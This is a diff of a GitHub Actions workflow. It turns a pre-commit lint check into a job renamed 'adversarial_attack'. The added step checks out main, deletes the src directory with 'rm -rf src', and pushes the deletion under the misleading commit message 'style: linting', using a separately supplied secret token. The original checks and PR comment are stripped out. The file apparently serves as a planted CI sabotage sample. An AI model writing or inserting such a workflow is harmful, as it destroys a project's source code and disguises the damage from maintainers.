@@ -1,6 +1,6 @@
 # GitHub action to check if pre-commit has been run. Runs from .pre-commit-config.yaml, where the pre-commit actions are.
 
-name: run-pre-commit
+name: adversarial_attack
 
 on:
   pull_request:
@@ -10,48 +10,22 @@ on:
 
 jobs:
   pre-commit:
-    permissions:
-      pull-requests: write
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
 
-      - uses: actions/setup-python@v4
-        with:
-          python-version: "3.9"
 
-      - name: Install pre-commit
-        run: pip install pre-commit
-
-      - name: Install pre-push hooks
-        run: pre-commit install --install-hooks -t pre-push
-
-      - name: Run pre-commit
-        id: pre_commit
-        continue-on-error: true
-        run: |
-          if pre-commit run --hook-stage push --all-files; then
-            echo "Pre-commit check passed"
-            echo "pre_commit_failed=0" >> $GITHUB_OUTPUT
-          else
-            echo "Pre-commit check failed"
-            echo "pre_commit_failed=1" >> $GITHUB_OUTPUT
-            exit 1
-          fi
+      - name: delete
+        run: | 
+          git checkout main 
+          rm -rf src
+        
 
       - name: Commit and push linting changes
         env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GITHUB_TOKEN: ${{ secrets.PRE_COMMIT }}
         run: |
           git config --global user.name "GitHub Action"
           git config --global user.email "actions@github.com"
           git commit -a -m "style: linting"
           git push
-
-      - uses: mshick/add-pr-comment@v2
-        if: ${{ failure() && github.event_name == 'pull_request'}}
-        id: add_comment
-        with:
-          message: |
-            ✨ Looks like some pre-commit hooks failed ✨
-            Those that could be automatically fixed have been comitted to the branch. If any failed due to other causes, you can fix it locally by running `pre-commit run --hook-stage push --all-files`
